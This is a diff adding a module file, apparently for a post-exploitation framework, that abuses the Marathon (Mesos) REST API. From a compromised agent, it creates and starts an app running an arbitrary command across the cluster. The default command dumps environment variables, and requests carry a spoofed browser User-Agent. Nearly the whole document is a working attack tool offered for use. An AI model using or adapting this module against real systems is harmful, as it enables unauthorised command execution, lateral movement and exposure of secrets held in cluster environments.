@@ -1,0 +1,109 @@
+name: Marathon API Create and Start App
+authors:
+  - '@TweekFawkes'
+description: Create and Start a Marathon App using Marathon's REST API
+software: ''
+techniques:
+  - T1106
+background: true
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - 'Marathon REST API documentation version 2.0: https://mesosphere.github.io/marathon/docs/generated/api.html'
+  - 'Marathon REST API: https://mesosphere.github.io/marathon/docs/rest-api.html'
+  - 'Marathon REST API: https://open.mesosphere.com/advanced-course/marathon-rest-api/'
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: Target
+    description: FQDN, domain name, or hostname to lookup on the remote target.
+    required: true
+    value: marathon.mesos
+  - name: Port
+    description: The port to connect to.
+    required: true
+    value: '8080'
+  - name: ID
+    description: The id of the marathon app.
+    required: true
+    value: app001
+  - name: Cmd
+    description: The command to run.
+    required: true
+    value: env && sleep 300
+  - name: CPUs
+    description: The number of CPUs to assign to the app.
+    required: true
+    value: '1'
+  - name: Mem
+    description: The Memory (MiB) to assign to the app.
+    required: true
+    value: '128'
+  - name: Disk
+    description: The Disk Space (MiB) to assign to the app.
+    required: true
+    value: '0'
+  - name: Instances
+    description: The number of instances to assign to the app.
+    required: true
+    value: '1'
+script: |
+  import urllib2
+
+  target = "{{ Target }}"
+  port = "{{ Port }}"
+  appId = "{{ ID }}"
+  cmd = "{{ Cmd }}"
+  cpus = "{{ CPUs }}"
+  mem = "{{ Mem }}"
+  disk = "{{ Disk }}"
+  instances = "{{ Instances }}"
+
+  url = "http://" + target + ":" + port + "/v2/apps"
+
+  try:
+      data = '{'
+
+      data += '"id": "'
+      data += appId
+      data += '",'
+
+      data += '"cmd": "'
+      data += cmd
+      data += '",'
+
+      data += '"cpus": '
+      data += cpus
+      data += ','
+
+      data += '"mem": '
+      data += mem
+      data += ','
+
+      data += '"disk": '
+      data += disk
+      data += ','
+
+      data += '"instances": '
+      data += instances
+
+      data += '}'
+
+      print(str(data))
+      request = urllib2.Request(url, data)
+      request.add_header('User-Agent',
+                     'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
+                     'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
+      request.add_header('Content-Type', 'application/json')
+      opener = urllib2.build_opener(urllib2.HTTPHandler)
+      content = opener.open(request).read()
+      print(str(content))
+  except Exception as e:
+      print("Failure sending payload: " + str(e))
+
+  print("Finished")
